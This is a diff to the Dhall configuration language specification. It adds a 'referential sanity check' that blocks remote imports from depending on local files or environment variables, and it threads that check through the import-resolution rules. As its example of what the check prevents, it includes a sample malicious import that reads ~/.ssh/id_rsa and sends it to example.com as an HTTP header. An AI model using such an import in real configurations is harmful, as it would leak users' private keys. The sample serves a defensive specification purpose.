@@ -4780,6 +4780,101 @@ To import a URL with quoted path components, percent-encode each quoted
 path component according to
 [RFC 3986 - Section 2](https://tools.ietf.org/html/rfc3986#section-2).
 
+### Referential sanity check
+
+The referential sanity check is used to ensure that a "referentially
+transparent" import can never depend on a "referentially opaque" import.
+
+A remote import such as `https://example.com/foo` is "referentially transparent"
+because the contents of the import does not change depending on which machine
+you import it from (with caveats, such as not tampering with DNS, etc.).
+
+All non-remote imports are "referentially opaque" because their contents depend
+on which machine that you import them from.
+
+Referential transparency is checked using a judgment of the form:
+
+    referentiallySane(parent, child)
+
+... where
+
+* `parent` (an input) is the canonicalized path of the parent import
+* `child` (an input) is the canonicalized path of the child import
+
+There is no output: either the judgment matches or it does not.
+
+The rules for the referential transparency check ensure that a referentially
+transparent parent can never import a referentially opaque child.  In practice
+this means that remote imports can only import other remote imports (after
+both imports have been canonicalized):
+
+
+    ───────────────────────────────────────────────────────────────────────────────────────────
+    referentiallySane(https://authority₀ directory₀ file₀, https://authority₁ directory₁ file₁)
+
+
+... whereas non-remote imports can import anything:
+
+
+    ────────────────────────────────────
+    referentiallySane(path file, import)
+
+
+    ──────────────────────────────────────
+    referentiallySane(. path file, import)
+
+
+    ───────────────────────────────────────
+    referentiallySane(.. path file, import)
+
+
+    ──────────────────────────────────────
+    referentiallySane(~ path file, import)
+
+
+    ────────────────────────────────
+    referentiallySane(env:x, import)
+
+
+This is a security check because it prevents remote imports from exfiltrating
+local paths and environment variables using the language's support for
+custom headers.  For example, this check prevents the following malicious
+import:
+
+
+    {- This file is hosted at `https://example.com/bad` and attempts to steal a
+       sensitive file from the user's system using the language's support for
+       custom headers
+    -}
+    https://example.com/recordHeaders using ./headers
+
+... which in turn tries to import this file:
+
+    {- This file is hosted at `https://example.com/headers` and attempts to
+       read in the contents of the user's private key
+
+       This import would be rejected because its canonical path is:
+
+           https://example.com/headers
+
+       ... whereas the canonical path of the private key is:
+
+           ~/.ssh/id_rsa
+
+       ... and the following `referentiallySane` judgment is not valid:
+
+           referentiallySane(https://example.com/headers, ~/.ssh/id_rsa)
+
+       ... because the referentially transparent remote import is trying to
+       access a referentially opaque local import.
+    -}
+    [ { header = "Private Key", value = ~/.ssh/id_rsa as Text } ]
+
+
+This is also a sanity check because a referentially transparent import cannot
+truly be referentially transparent if it depends on any referentially opaque
+imports.
+
 ### Import resolution judgment
 
 The import resolution phase replaces all imports with the expression located
@@ -4797,7 +4892,8 @@ Import resolution is a function of the following form:
   the state of the filesystem/environment/web before the import
     * `Γ₀(import)` means to retrieve the expression located at `import`
 * `e₀` (an input) is the expression to resolve
-* `here` (an input) is the current import, used to resolve relative imports
+* `here` (an input) is the current import (canonicalized), used to resolve
+   relative imports
 * `e₁` (an output) is the import-free resolved expression
 * `Γ₁` (an output) is an unordered map from imports to expressions representing
   the state of the filesystem/environment/web after the import
@@ -4808,19 +4904,20 @@ then you retrieve the expression from the canonicalized path and transitively
 resolve imports within the retrieved expression:
 
 
-    here </> import₀ = import₁
-    canonicalize(import₁) = import₂
-    Γ(import₂) = e₀                    ; Retrieve the expression
-    Δ, import₂ × Γ₀ ⊢ e₀ @ import₂ ⇒ e₁ ⊢ Γ₁
+    parent </> import₀ = import₁
+    canonicalize(import₁) = child
+    referentiallySane(parent, child)
+    Γ(child) = e₀                        ; Retrieve the expression
+    Δ, child × Γ₀ ⊢ e₀ @ child ⇒ e₁ ⊢ Γ₁
     ε ⊢ e₁ : T
-    ─────────────────────────────────  ; * import₂ ∉ Δ
-    Δ × Γ₀ ⊢ import₀ @ here ⇒ e₁ ⊢ Γ₁  ; * import₀ ≠ missing
+    ───────────────────────────────────  ; * child ∉ Δ
+    Δ × Γ₀ ⊢ import₀ @ parent ⇒ e₁ ⊢ Γ₁  ; * import₀ ≠ missing
 
 
 Carefully note that the fully resolved import must successfully type-check with
 an empty context.  Imported expressions may not contain any free variables.
 
-Also note that the `import₂ ∉ Δ` forbids cyclic imports to prevent
+Also note that the `child ∉ Δ` forbids cyclic imports to prevent
 non-termination from being (trivially) introduced via the import system.  An
 import cycle is an import resolution error.
 
@@ -4828,27 +4925,29 @@ If an import ends with `as Text`, import the raw contents of the file as a
 `Text` value instead of importing the file a Dhall expression:
 
 
-    here </> import₀ = import₁
-    canonicalize(import₁) = import₂
-    Γ(import₂) = "s"                         ; Read the raw contents of the file
-    ────────────────────────────────────────
-    Δ × Γ ⊢ import₀ as Text @ here ⇒ "s" ⊢ Γ
+    parent </> import₀ = import₁
+    canonicalize(import₁) = child
+    referentiallySane(parent, child)
+    Γ(child) = "s"  ; Read the raw contents of the file
+    ──────────────────────────────────────────
+    Δ × Γ ⊢ import₀ as Text @ parent ⇒ "s" ⊢ Γ
 
 
 If an import ends with `using headers`, resolve the `headers` import and use
 the resolved expression as additional headers supplied to the HTTP request:
 
 
-    Δ × Γ₀ ⊢ headers @ here ⇒ h₀ ⊢ Γ₁
+    Δ × Γ₀ ⊢ headers @ parent ⇒ h₀ ⊢ Γ₁
     ε ⊢ h₀ : List { header : Text, value : Text }
     h₀ ⇥ h₁
-    here </> import₀ = import₁
-    canonicalize(import₁) = import₂
+    parent </> import₀ = import₁
+    canonicalize(import₁) = child
+    referentiallySane(parent, child)
     Γ₁(https://authority directory file) = e₀  ; Use h₁ for custom headers here
-    Δ, import₂ × Γ₁ ⊢ e₀ @ import₂ ⇒ e₁ ⊢ Γ₂
+    Δ, child × Γ₁ ⊢ e₀ @ child ⇒ e₁ ⊢ Γ₂
     ε ⊢ e₁ : T
-    ────────────────────────────────────────────────────────────────────────  ; * import₂ ∉ Δ
-    Δ × Γ₀ ⊢ https://authority directory file @ here using headers ⇒ e₁ ⊢ Γ₂  ; * import₀ ≠ missing
+    ──────────────────────────────────────────────────────────────────────────  ; * child ∉ Δ
+    Δ × Γ₀ ⊢ https://authority directory file @ parent using headers ⇒ e₁ ⊢ Γ₂  ; * import₀ ≠ missing
 
 
 For example, if `h₁` in the above judgment normalized to:
